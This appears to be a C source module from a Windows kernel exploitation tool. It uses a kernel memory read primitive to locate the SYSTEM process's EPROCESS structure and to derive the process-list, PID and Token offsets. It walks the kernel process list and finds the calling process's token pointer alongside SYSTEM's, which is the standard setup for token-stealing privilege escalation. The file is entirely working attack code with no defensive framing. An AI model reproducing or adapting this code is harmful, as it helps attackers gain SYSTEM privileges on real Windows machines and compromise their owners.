#include "ft.h"

#include <tlhelp32.h>
#include <string.h>

static const uint32_t ft_token_table[] = {
    0x248u,
    0x4C0u,
    0x4B8u,
    0x360u,
    0x2F8u
};

int ft_proc_self_luid(ft_ctx* c, uint64_t* luid) {
    HANDLE tok = NULL;
    TOKEN_STATISTICS ts;
    DWORD sz = 0;

    (void)c;
    if (!luid) return 0;
    *luid = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return 0;
    if (!GetTokenInformation(tok, TokenStatistics, &ts, sizeof ts, &sz)) {
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    *luid = ((uint64_t)(uint32_t)ts.TokenId.HighPart << 32) | (uint32_t)ts.TokenId.LowPart;
    return 1;
}

int ft_token_id_of_process(ft_ctx* c, uint32_t pid, uint64_t* token_id) {
    HANDLE proc = NULL;
    HANDLE tok = NULL;
    TOKEN_STATISTICS ts;
    DWORD sz = 0;
    int ok = 0;

    (void)c;
    if (!token_id) return 0;
    *token_id = 0;

    if (pid == 0 || pid == ft_proc_self_pid()) {
        proc = GetCurrentProcess();
    } else {
        proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!proc) {
            proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
            if (!proc) return 0;
        }
    }
    if (!OpenProcessToken(proc, TOKEN_QUERY, &tok)) {
        if (proc != GetCurrentProcess()) CloseHandle(proc);
        return 0;
    }
    if (GetTokenInformation(tok, TokenStatistics, &ts, sizeof ts, &sz)) {
        *token_id = ((uint64_t)(uint32_t)ts.TokenId.HighPart << 32) |
                    (uint32_t)ts.TokenId.LowPart;
        ok = 1;
    }
    CloseHandle(tok);
    if (proc != GetCurrentProcess()) CloseHandle(proc);
    return ok;
}

int ft_proc_is_system(ft_ctx* c) {
    HANDLE tok = NULL;

    union {
        TOKEN_USER tu;
        BYTE buf[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    } u;
    DWORD sz = 0;
    BYTE sysbuf[SECURITY_MAX_SID_SIZE];
    PSID sysid = (PSID)sysbuf;
    DWORD sysid_len = (DWORD)sizeof sysbuf;
    int same = 0;

    (void)c;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return 0;
    memset(&u, 0, sizeof u);
    if (GetTokenInformation(tok, TokenUser, u.buf, (DWORD)sizeof u.buf, &sz)) {
        if (CreateWellKnownSid(WinLocalSystemSid, NULL, sysid, &sysid_len)) {
            same = EqualSid(u.tu.User.Sid, sysid) ? 1 : 0;
        }
    }
    CloseHandle(tok);
    return same;
}

uint32_t ft_proc_self_pid(void) {
    return (uint32_t)GetCurrentProcessId();
}

static int ft_list_flink(ft_ctx* c, uint64_t node, uint64_t* next) {
    uint64_t v = 0;
    ft_rr r;
    if (!next) return 0;
    r = ft_km_read64(c, node, &v);
    if (r == FTR_FAIL || r == FTR_CONFLICT) return 0;

    if (v != 0 && !ft_is_kernel_ptr(v)) return 0;
    *next = v;
    return 1;
}

int ft_proc_walk(ft_ctx* c, uint64_t* eprocs, int max, int* count) {
    uint64_t cur;
    uint64_t root;
    int n = 0;
    int i;

    if (!c || !c->ep_ready || !c->sys_ep) return 0;
    root = c->sys_ep + c->ep_links_off;
    if (!ft_list_flink(c, root, &cur)) return 0;
    if (cur == 0) return 0;

    for (i = 0; i < FT_WALK_MAX; i++) {
        if (n < max && eprocs) eprocs[n] = cur - c->ep_links_off;
        n++;
        if (!ft_list_flink(c, cur, &cur)) break;
        if (cur == 0) break;
        if (cur == root) break;
    }
    if (count) *count = n;
    return n;
}

int ft_proc_find_by_pid(ft_ctx* c, uint32_t pid, uint64_t* eproc) {
    uint64_t cur;
    uint64_t root;
    int i;

    if (!c || !c->ep_ready || !c->sys_ep) return 0;
    if (eproc) *eproc = 0;
    root = c->sys_ep + c->ep_links_off;
    if (!ft_list_flink(c, root, &cur)) return 0;

    for (i = 0; i < FT_WALK_MAX; i++) {
        uint32_t epid = 0;
        ft_rr r;
        if (cur == 0) return 0;
        if (cur == root) return 0;
        r = ft_km_read32(c, (cur - c->ep_links_off) + c->ep_pid_off, &epid);
        if (r != FTR_VAL) return 0;
        if (epid == pid) {
            if (eproc) *eproc = cur - c->ep_links_off;
            return 1;
        }
        if (!ft_list_flink(c, cur, &cur)) return 0;
    }
    return 0;
}

int ft_proc_pid_at(ft_ctx* c, uint64_t eproc, uint32_t* pid) {
    uint32_t v = 0;
    if (!c || !c->ep_ready || !eproc) return 0;
    if (ft_km_read32(c, eproc + c->ep_pid_off, &v) != FTR_VAL) return 0;
    if (pid) *pid = v;
    return 1;
}

int ft_proc_find_by_name(ft_ctx* c, const char* name, uint32_t* pid) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    int found = 0;

    (void)c;
    if (!name || !*name) return 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    memset(&pe, 0, sizeof pe);
    pe.dwSize = sizeof pe;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                if (pid) *pid = (uint32_t)pe.th32ProcessID;
                found = 1;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static uint32_t ft_first_page_limit(uint64_t obj) {
    uint64_t room = 0x1000 - (obj & 0xFFFULL);
    if (room < 16) return 0;
    return (uint32_t)(room - 16);
}

static int ft_derive_links_offset(ft_ctx* c, uint64_t sys_ep, uint32_t* out,
                                   uint32_t* stats, uint32_t* cand_x,
                                   uint64_t* cand_a, uint64_t* cand_b) {
    uint32_t x;
    uint32_t limit = ft_first_page_limit(sys_ep);

    if (stats) {
        stats[0] = stats[1] = stats[2] = stats[3] = stats[4] = 0;
    }
    if (cand_x) *cand_x = 0;
    if (cand_a) *cand_a = 0;
    if (cand_b) *cand_b = 0;

    for (x = 0x20; x <= limit; x += 8) {
        uint64_t spid = 0, a = 0, b = 0, v = 0;

        if (stats) stats[0]++;

        if (ft_km_read64(c, sys_ep + x - 8, &spid) != FTR_VAL) continue;
        if ((uint32_t)spid != 4u) continue;
        if (stats) stats[1]++;

        if (ft_km_read64(c, sys_ep + x, &a) != FTR_VAL) continue;
        if (ft_km_read64(c, sys_ep + x + 8, &b) != FTR_VAL) continue;
        if (!ft_is_kernel_ptr(a) || !ft_is_kernel_ptr(b)) continue;
        if (stats) stats[2]++;

        if (((a - x) & 0x7) || ((b - x) & 0x7)) continue;
        if (a == b) continue;
        if (stats) stats[3]++;
        if (cand_x) *cand_x = x;
        if (cand_a) *cand_a = a;
        if (cand_b) *cand_b = b;

        if (ft_km_read64(c, a - 8, &v) != FTR_VAL) continue;
        if (v == 0 || v > 0x10000000ull) continue;
        if (ft_km_read64(c, a + 8, &v) != FTR_VAL) continue;
        if (v != sys_ep + x) continue;
        if (stats) stats[4]++;

        *out = x;
        return 1;
    }
    return 0;
}

#define FT_TOKEN_TAG_MASK 0xFULL

static int ft_token_candidate(ft_ctx* c, uint64_t self_ep, uint64_t sys_ep,
                              uint32_t t, uint64_t luid, int* delta_out) {
    uint64_t raw = 0, s = 0, p = 0;
    int d;

    (void)sys_ep;
    if (ft_km_read64(c, self_ep + t, &raw) != FTR_VAL) return 0;
    if (!ft_is_kernel_ptr(raw)) return 0;
    p = raw & ~FT_TOKEN_TAG_MASK;
    if ((p & 0x7) != 0) return 0;
    ft_km_read64(c, sys_ep + t, &s);

    for (d = -16; d <= 0x100; d += 8) {
        uint64_t id = 0;
        if (ft_km_read64(c, p + d, &id) != FTR_VAL) continue;
        if (id == luid) {
            if (delta_out) *delta_out = d;
            return 1;
        }
    }
    return 0;
}

static int ft_derive_token_offset(ft_ctx* c, uint64_t self_ep, uint64_t sys_ep,
                                   uint64_t luid, uint32_t* out, int* delta_out,
                                   ft_sb* diag) {
    uint32_t i;
    uint32_t limit = ft_first_page_limit(self_ep);

    for (i = 0; i < sizeof ft_token_table / sizeof ft_token_table[0]; i++) {
        uint32_t t = ft_token_table[i];
        uint64_t p = 0, s = 0;
        if (t > limit) continue;
        if (ft_token_candidate(c, self_ep, sys_ep, t, luid, delta_out)) {
            *out = t;
            return 1;
        }
        if (diag) {
            ft_km_read64(c, self_ep + t, &p);
            ft_km_read64(c, sys_ep + t, &s);
            ft_sb_addf(diag, "%s%u:p=0x%llx,s=0x%llx",
                       i ? "," : "", t, (unsigned long long)p,
                       (unsigned long long)s);
        }
    }
    if (diag) ft_sb_addf(diag, " | limit=%u luid=0x%llx", limit,
                         (unsigned long long)luid);

    for (i = 0x08; i <= limit; i += 8) {
        if (ft_token_candidate(c, self_ep, sys_ep, i, luid, delta_out)) {
            *out = i;
            return 1;
        }
    }
    return 0;
}

int ft_proc_derive_layout(ft_ctx* c) {
    uint32_t rva = 0;
    uint64_t sys_ep = 0;
    uint32_t x = 0;
    uint64_t luid = 0;
    uint64_t self_ep = 0;
    uint32_t t = 0;
    int tok_delta = 0;
    uint32_t self_pid = ft_proc_self_pid();
    uint32_t stats[5];
    uint32_t cand_x = 0;
    uint64_t cand_a = 0, cand_b = 0;
    int count = 0;
    ft_sb f;

    if (!c) return FT_E_INTERNAL;
    if (c->ep_ready) return FT_OK;

    if (!ft_ntos_export_rva(c, "PsInitialSystemProcess", &rva) || rva == 0) {
        ft_err(c, "layout_no_symbol", "\"sym\":\"PsInitialSystemProcess\"");
        return FT_E_BUILD;
    }
    if (ft_km_read64(c, ft_ntos_base(c) + rva, &sys_ep) != FTR_VAL ||
        !ft_is_kernel_ptr(sys_ep)) {
        ft_err(c, "layout_no_sysep", "\"rva\":%u", rva);
        return FT_E_BUILD;
    }

    if (!ft_derive_links_offset(c, sys_ep, &x, stats, &cand_x, &cand_a, &cand_b)) {
        ft_err(c, "layout_links_failed",
               "\"sys_ep\":\"0x%llx\",\"scanned\":%u,\"pid_hits\":%u,\"ptr_hits\":%u,\"align_hits\":%u,\"link_hits\":%u,\"cand_x\":%u,\"cand_a\":\"0x%llx\",\"cand_b\":\"0x%llx\"",
               (unsigned long long)sys_ep, stats[0], stats[1], stats[2],
               stats[3], stats[4], cand_x, (unsigned long long)cand_a,
               (unsigned long long)cand_b);
        return FT_E_BUILD;
    }
    c->sys_ep = sys_ep;
    c->ep_links_off = x;
    c->ep_pid_off = x - 8;

    c->ep_ready = 1;

    if (!ft_proc_self_luid(c, &luid)) {
        ft_err(c, "layout_no_luid", "");
        c->ep_ready = 0;
        return FT_E_BUILD;
    }
    if (!ft_proc_find_by_pid(c, self_pid, &self_ep) || !self_ep) {
        ft_err(c, "layout_no_self", "\"pid\":%u,\"links_off\":%u",
               self_pid, c->ep_links_off);
        c->ep_ready = 0;
        return FT_E_BUILD;
    }
    {
        ft_sb diag;
        ft_sb_init(&diag);
        if (!ft_derive_token_offset(c, self_ep, sys_ep, luid, &t, &tok_delta, &diag)) {
            ft_err(c, "layout_token_failed",
                   "\"self\":\"0x%llx\",\"sys\":\"0x%llx\",\"diag\":\"%s\"",
                   (unsigned long long)self_ep, (unsigned long long)sys_ep,
                   diag.buf ? diag.buf : "");
            ft_sb_free(&diag);
            c->ep_ready = 0;
            return FT_E_BUILD;
        }
        ft_sb_free(&diag);
    }
    c->ep_token_off = t;
    c->ep_luid_delta = tok_delta;

    if (ft_proc_walk(c, NULL, 0, &count) < 2) {
        ft_err(c, "layout_short_list", "\"count\":%d", count);
        return FT_E_BUILD;
    }
    {
        uint64_t syspid = 0;
        if (ft_km_read64(c, c->sys_ep + c->ep_pid_off, &syspid) != FTR_VAL ||
            (uint32_t)syspid != 4u) {
            ft_err(c, "layout_bad_syspid", "\"pid\":%llu",
                   (unsigned long long)syspid);
            return FT_E_BUILD;
        }
    }

    c->ep_ready = 1;

    ft_sb_init(&f);
    {
        uint64_t tp = 0, sp = 0, lid = 0;
        ft_km_read64(c, self_ep + c->ep_token_off, &tp);
        ft_km_read64(c, sys_ep + c->ep_token_off, &sp);
        ft_km_read64(c, (tp & ~FT_TOKEN_TAG_MASK) + tok_delta, &lid);
        ft_sb_addf(&f, "\"sys_ep\":\"0x%llx\",\"pid_off\":%u,\"links_off\":%u,\"token_off\":%u,\"procs\":%d,\"tok_raw\":\"0x%llx\",\"tok_ptr\":\"0x%llx\",\"sys_tok_raw\":\"0x%llx\",\"sys_tok_ptr\":\"0x%llx\",\"luid_delta\":%d,\"luid\":\"0x%llx\"",
                   (unsigned long long)sys_ep, c->ep_pid_off, c->ep_links_off,
                   c->ep_token_off, count, (unsigned long long)tp,
                   (unsigned long long)(tp & ~FT_TOKEN_TAG_MASK),
                   (unsigned long long)sp,
                   (unsigned long long)(sp & ~FT_TOKEN_TAG_MASK),
                   tok_delta, (unsigned long long)lid);
    }
    ft_ok(c, "layout_derived", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}
